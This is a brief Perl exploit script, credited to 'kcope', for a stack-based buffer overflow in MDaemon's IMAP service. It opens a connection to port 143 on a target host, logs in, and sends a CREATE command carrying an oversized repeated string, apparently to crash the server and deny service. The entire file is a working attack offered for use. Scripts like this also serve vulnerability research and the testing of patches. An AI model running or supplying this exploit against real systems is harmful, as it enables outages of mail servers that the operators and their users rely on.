### MDAEMON stack based buffer overflow
### Remote DoS exploit by kcope
use IO::Socket::INET;
$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                             PeerPort => '143',
                             Proto    => 'tcp');

$a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\" x 10;

print $sock "a001 LOGIN username password\r\n";
print $sock "a001 CREATE $a\r\n";

while (<$sock>) {
   print $_;
}

